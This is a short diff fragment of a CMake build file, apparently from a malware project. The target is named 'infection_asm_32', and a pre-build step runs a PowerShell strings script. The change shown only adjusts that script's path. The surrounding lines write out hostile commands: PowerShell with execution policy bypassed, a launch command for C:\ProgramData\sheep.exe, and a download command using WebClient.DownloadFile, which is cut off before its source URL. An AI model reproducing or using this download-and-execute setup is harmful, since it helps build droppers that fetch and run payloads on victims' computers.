@@ -11,7 +11,7 @@ add_custom_command(TARGET infection_asm_32
   PRE_BUILD
   COMMAND powershell ARGS
   -ExecutionPolicy bypass
-  -File "${CMAKE_CURRENT_SOURCE_DIR}/strings.ps1"
+  -File "${CMAKE_CURRENT_SOURCE_DIR}/../strings.ps1"
   -launch_command "C:\\ProgramData\\sheep.exe"
   -download_command "powershell -ExecutionPolicy bypass \
 -Command \"(New-Object System.Net.WebClient).DownloadFile(\
